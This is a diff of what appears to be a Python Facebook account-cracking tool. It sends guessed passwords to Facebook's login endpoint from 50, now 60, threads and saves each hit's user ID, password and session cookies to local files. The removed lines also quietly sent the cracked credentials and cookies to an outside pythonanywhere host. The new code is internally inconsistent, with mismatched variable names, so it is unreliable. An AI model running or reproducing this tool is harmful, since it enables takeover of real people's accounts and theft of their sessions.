@@ -505,7 +505,7 @@ def HAMSTER2():
     #print(" [6] METHOD ")
     linex()
     HAMSTERfire = input("[:] [CHOOSE] :- ")
-    with ThreadPool(max_workers=50) as HAMSTER_xd:
+    with ThreadPool(max_workers=60) as HAMSTER_xd:
         clear()
         HAMSTER_time()
         tl = str(len(user))
@@ -1195,33 +1195,40 @@ def mobile(uid,pwx,tl):
             url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100'
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{green}(HAMSTER-LGN){cid}|{pw}")
-                        print(f" {green}COKI : {green}{coki}")
-                        open("/sdcard/HAMSTER-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
+            if "c_user" in log_cookies:
+                #kuki = convert(session.cookies.get_dict())
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                user = re.findall('c_user=(.*);xs', kuki)[0]
+                xs_value = None
+                for part in kuki.split(';'):
+                    if part.startswith('xs='):
+                        xs_value = part.split('=', 1)[1]
+                        break
+                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                    if xs_value and xs_value.rstrip(';').endswith('-1'):
+                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        oks.append(ids)
                         break
                     else:
-                        print(f"{red}(2F){cid}")
-                        statusok = (f"{cid}|{pw}|{coki}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        oks.append(ids)
                         break
-                else:
-                    break
-            elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[HAMSTER-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/HAMSTER-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
+            elif "checkpoint" in log_cookies:
+                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
+                cid = coki[24:39]
+                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
+                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                cps.append(ids)
                 break
-            else:
-                continue
+            else:continue
         loop+=1
     except ce:
         time.sleep(20)
